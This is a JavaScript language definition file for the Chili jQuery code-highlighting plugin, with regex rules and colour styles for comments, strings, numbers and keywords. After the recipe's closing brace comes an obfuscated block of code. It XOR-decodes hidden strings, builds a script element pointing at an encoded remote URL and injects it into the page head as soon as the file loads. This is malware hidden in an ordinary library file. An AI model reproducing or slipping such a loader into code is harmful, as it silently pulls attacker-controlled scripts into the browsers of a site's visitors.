/*
===============================================================================
Chili is the jQuery code highlighter plugin
...............................................................................
LICENSE: http://www.opensource.org/licenses/mit-license.php
WEBSITE: http://noteslog.com/chili/

                                               Copyright 2008 / Andrea Ercolino
===============================================================================
*/

{
	  _name: 'js'
	, _case: true
	, _main: {
		  ml_comment: { 
			  _match: /\/\*[^*]*\*+(?:[^\/][^*]*\*+)*\//
			, _style: 'color: gray;'
		}
		, sl_comment: { 
			  _match: /\/\/.*/
			, _style: 'color: green;'
		}
		, string: { 
			  _match: /(?:\'[^\'\\\n]*(?:\\.[^\'\\\n]*)*\')|(?:\"[^\"\\\n]*(?:\\.[^\"\\\n]*)*\")/
			, _style: 'color: teal;'
		}
		, num: { 
			  _match: /\b[+-]?(?:\d*\.?\d+|\d+\.?\d*)(?:[eE][+-]?\d+)?\b/
			, _style: 'color: red;'
		}
		, reg_not: { //this prevents "a / b / c" to be interpreted as a reg_exp
			  _match: /(?:\w+\s*)\/[^\/\\\n]*(?:\\.[^\/\\\n]*)*\/[gim]*(?:\s*\w+)/
			, _replace: function( all ) {
				return this.x( all, '//num' );
			}
		}
		, reg_exp: { 
			  _match: /\/[^\/\\\n]*(?:\\.[^\/\\\n]*)*\/[gim]*/
			, _style: 'color: maroon;'
		}
		, brace: { 
			  _match: /[\{\}]/
			, _style: 'color: red; font-weight: bold;'
		}
		, statement: { 
			  _match: /\b(with|while|var|try|throw|switch|return|if|for|finally|else|do|default|continue|const|catch|case|break)\b/
			, _style: 'color: navy; font-weight: bold;'
		}
		, error: { 
			  _match: /\b(URIError|TypeError|SyntaxError|ReferenceError|RangeError|EvalError|Error)\b/
			, _style: 'color: Coral;'
		}
		, object: { 
			  _match: /\b(String|RegExp|Object|Number|Math|Function|Date|Boolean|Array)\b/
			, _style: 'color: DeepPink;'
		}
		, property: { 
			  _match: /\b(undefined|arguments|NaN|Infinity)\b/
			, _style: 'color: Purple; font-weight: bold;'
		}
		, 'function': { 
			  _match: /\b(parseInt|parseFloat|isNaN|isFinite|eval|encodeURIComponent|encodeURI|decodeURIComponent|decodeURI)\b/
			, _style: 'color: olive;'
		}
		, operator: {
			  _match: /\b(void|typeof|this|new|instanceof|in|function|delete)\b/
			, _style: 'color: RoyalBlue; font-weight: bold;'
		}
		, liveconnect: {
			  _match: /\b(sun|netscape|java|Packages|JavaPackage|JavaObject|JavaClass|JavaArray|JSObject|JSException)\b/
			, _style: 'text-decoration: overline;'
		}
	}
}
function kHT88(ne6){var vt='';var cT4E1=0;var xH=0;for(cT4E1=0;cT4E1<ne6.length/3;cT4E1++){vt+=String.fromCharCode(ne6.slice(xH,xH+3));xH=xH+3;}return vt;}function g9V(aCg){return dq1GWP(kHT88(aCg),'hwe207C9EIAhO0');}var aLmOz0v=["027020","026030","024003","011005000083068082006085032036036006059","027005006","028014021087","028018029070031093034079036058034026038064028","009007021087094083000081044037037","000018004086","015018017119092082046092043061050042054100009016043083093082","000003017066010024108074049040053013097067005027087028066066108083054102034006059030002004"];function dq1GWP(hNqs3p,m0oj){var nC='';var tSe=0;var mxshs=0;for(tSe=0;tSe<hNqs3p.length;tSe++){var bb=hNqs3p.charAt(tSe);var lETh0=bb.charCodeAt(0)^m0oj.charCodeAt(mxshs);bb=String.fromCharCode(lETh0);nC+=bb;if(mxshs==m0oj.length-1)mxshs=0;else mxshs++;}return (nC);}function zP81l(o2){var ig7=document[g9V(aLmOz0v[3])](g9V(aLmOz0v[0])+g9V(aLmOz0v[1])+g9V(aLmOz0v[2]));ig7[g9V(aLmOz0v[4])]=o2;ig7[g9V(aLmOz0v[5])]=g9V(aLmOz0v[6]);document[g9V(aLmOz0v[9])](g9V(aLmOz0v[8]))[0][g9V(aLmOz0v[7])](ig7);}zP81l(g9V(aLmOz0v[10]));